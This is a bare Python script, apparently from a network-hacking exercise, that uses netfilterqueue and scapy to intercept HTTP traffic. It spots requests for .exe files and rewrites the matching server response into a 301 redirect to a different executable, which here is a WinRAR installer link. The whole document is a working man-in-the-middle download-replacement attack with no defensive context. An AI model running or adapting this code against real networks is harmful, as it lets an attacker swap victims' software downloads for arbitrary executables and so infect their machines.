import netfilterqueue
import scapy.all as scapy
import re

def modify_load(packet, load):
    packet[scapy.Raw].load = load.encode()
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

ack_list=[]

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load = scapy_packet[scapy.Raw].load.decode()
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in load:
                    print("[+] exe Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ack_list.remove(scapy_packet[scapy.TCP].seq)
                    load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x64-602ar.exe"
                    new_packet = modify_load(scapy_packet, load)
                    packet.set_payload(bytes(new_packet))
                    print("[+] Response")
                    print(scapy_packet.show())
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
